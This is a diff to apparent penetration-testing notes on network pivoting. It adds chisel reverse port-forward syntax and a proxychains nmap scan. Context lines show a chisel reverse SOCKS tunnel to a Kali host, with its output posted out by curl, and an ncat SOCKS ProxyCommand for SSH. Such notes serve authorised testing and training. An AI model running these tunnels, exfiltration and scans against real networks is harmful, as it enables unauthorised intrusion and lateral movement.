@@ -82,6 +82,14 @@ chisel client kali_IP:8080 R:socks &> /tmp/output; curl --data @/tmp/output http
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' host_c  user@host_c
 ```
 
+```
+//to forw a single port , we can use case B: 
+R:port(localhost):3edhostIP:port(3rd)
+
+//if want to use dynamic, proxychains
+proxychains nmap -sT -Pn -n -p 22,80,443 IP
+
+```
 
 ### For Win
 ##### SSH
